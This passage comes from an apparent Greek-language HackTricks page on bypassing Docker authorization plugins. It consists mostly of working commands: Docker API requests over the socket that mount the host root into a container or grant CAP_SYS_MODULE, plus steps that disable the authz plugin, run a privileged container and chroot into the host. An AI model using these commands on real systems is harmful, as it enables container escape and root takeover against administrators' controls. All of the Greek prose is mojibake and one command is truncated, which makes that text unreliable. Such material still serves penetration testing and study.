Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Î¾ÎµÏ‡Î¬ÏƒÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹Î± Î±Ï€ÏŒ Î±Ï…Ï„Î¬** Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± **Î±Î½Î±Î²Î±Î¸Î¼Î¯ÏƒÎµÎ¹ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î¬ Ï„Î¿Ï…**.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¿ API Ï„Î¿Ï… docker ÏƒÏ„Î¿ [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## ÎœÎ· ÎµÎ»ÎµÎ³Î¼Î­Î½Î· Î´Î¿Î¼Î® JSON

### Binds ÏƒÏ„Î¿Î½ root

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ ÏŒÏ„Î±Î½ Î¿ ÏƒÏ…ÏƒÏ„Î·Î¼Î¹ÎºÏŒÏ‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ ÏÏÎ¸Î¼Î¹ÏƒÎµ Ï„Î¿ Ï„ÎµÎ¯Ï‡Î¿Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î±Ï‚ Ï„Î¿Ï… docker Î½Î± **Î¾Î­Ï‡Î±ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿** Ï„Î¿Ï… [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) ÏŒÏ€Ï‰Ï‚ Ï„Î¿ "**Binds**".\
Î£Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÏƒÏ†Î±Î»Î¼Î­Î½Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î­Î½Î± container Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÎ±ÏÏ„Î¬ Ï„Î¿Î½ root (/) Ï†Î¬ÎºÎµÎ»Î¿ Ï„Î¿Ï… ÎºÎµÎ½Ï„ÏÎ¹ÎºÎ¿Ï Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·: Î Î±ÏÎ±Ï„Î·ÏÎ®ÏƒÏ„Îµ ÏŒÏ„Î¹ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ¼Îµ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ **`Binds`** Ï‰Ï‚ Î­Î½Î± ÎºÎ»ÎµÎ¹Î´Î¯ ÏƒÏ„Î¿ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ ÏÎ¯Î¶Î±Ï‚ ÏƒÏ„Î¿ JSON, Î±Î»Î»Î¬ ÏƒÏ„Î¿ API ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÏ„Î±Î¹ Ï…Ï€ÏŒ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ **`HostConfig`**.
{% endhint %}

### Binds ÏƒÏ„Î¿ HostConfig

Î‘ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ Ï„Î¹Ï‚ Î¯Î´Î¹ÎµÏ‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ Î¼Îµ Ï„Î¿ **Binds ÏƒÏ„Î¿ root**, ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„ÏŒ Ï„Î¿ **Î±Î¯Ï„Î·Î¼Î±** ÏƒÏ„Î¿ Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Î£Ï…Î½Î´Î­ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î¿Î½ ÏÎ¹Î¶Î¹ÎºÏŒ Ï†Î¬ÎºÎµÎ»Î¿

Î‘ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ Ï„Î¹Ï‚ Î¯Î´Î¹ÎµÏ‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ Î¼Îµ Ï„Î¹Ï‚ **Î£Ï…Î½Î´Î­ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î¿Î½ ÏÎ¹Î¶Î¹ÎºÏŒ Ï†Î¬ÎºÎµÎ»Î¿** ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„ÏŒ Ï„Î¿ **Î±Î¯Ï„Î·Î¼Î±** ÏƒÏ„Î¿ Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Î£Ï…Î½Î±ÏÎ¼Î¿Î»Î¿Î³Î®ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î¿ HostConfig

Î‘ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ Ï„Î¹Ï‚ Î¯Î´Î¹ÎµÏ‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ Î¼Îµ Ï„Î¹Ï‚ **Î£Ï…Î½Î´Î­ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î· ÏÎ¯Î¶Î±** ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„ÏŒ Ï„Î¿ **Î±Î¯Ï„Î·Î¼Î±** ÏƒÏ„Î¿ Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## ÎœÎ· ÎµÎ»ÎµÎ³Î¼Î­Î½Î¿ JSON Î§Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ ÏŒÏ„Î±Î½ Î¿ ÏƒÏ…ÏƒÏ„Î·Î¼Î¹ÎºÏŒÏ‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ ÏÏÎ¸Î¼Î¹ÏƒÎµ Ï„Î¿ Ï„ÎµÎ¯Ï‡Î¿Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï„Î¿Ï… Docker Î½Î± **Î¾Î­Ï‡Î±ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ ÎµÎ½ÏŒÏ‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…** Ï„Î¿Ï… [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) ÏŒÏ€Ï‰Ï‚ Ï„Î¿ "**Capabilities**" Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ "**HostConfig**". Î£Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÏƒÏ†Î±Î»Î¼Î­Î½Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î­Î½Î±Î½ container Î¼Îµ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
Î¤Î¿ **`HostConfig`** ÎµÎ¯Î½Î±Î¹ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï€Î¿Ï… ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î± **ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î±** **Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±** Î³Î¹Î± Î½Î± Î´ÏÎ±Ï€ÎµÏ„ÎµÏÏƒÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿Î½ container. Î©ÏƒÏ„ÏŒÏƒÎ¿, ÏŒÏ€Ï‰Ï‚ Î­Ï‡Î¿Ï…Î¼Îµ ÏƒÏ…Î¶Î·Ï„Î®ÏƒÎµÎ¹ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚, Ï€Î±ÏÎ±Ï„Î·ÏÎ®ÏƒÏ„Îµ Ï€ÏÏ‚ Î· Ï‡ÏÎ®ÏƒÎ· Ï„Ï‰Î½ Binds Î­Î¾Ï‰ Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿ÏÏ‚.
{% endhint %}

## Î‘Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… Plugin

Î‘Î½ Î¿ **sysadmin** Î¾Î­Ï‡Î±ÏƒÎµ Î½Î± **Î±Ï€Î±Î³Î¿ÏÎµÏÏƒÎµÎ¹** Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± **Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚** Ï„Î¿Ï… **plugin**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± Ï„Î¿ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÎµÎ½Ï„ÎµÎ»ÏÏ‚!
```bash
docker plugin list #Enumerate plugins

# If you donâ€™t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Î˜Ï…Î¼Î·Î¸ÎµÎ¯Ï„Îµ Î½Î± **ÎµÏ€Î±Î½ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ Î¼ÎµÏ„Î¬ Ï„Î·Î½ Î±Î½ÏŒÎ´Î¿ ÏƒÏ„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±**, Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¬ Î· **ÎµÏ€Î±Î½ÎµÎºÎºÎ¯Î½Î·ÏƒÎ· Ï„Î·Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ docker Î´ÎµÎ½ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹**!

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚ Î³Î¹Î± Ï„Î·Î½ Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Ï„Î¿Ï… Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿Ï… ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
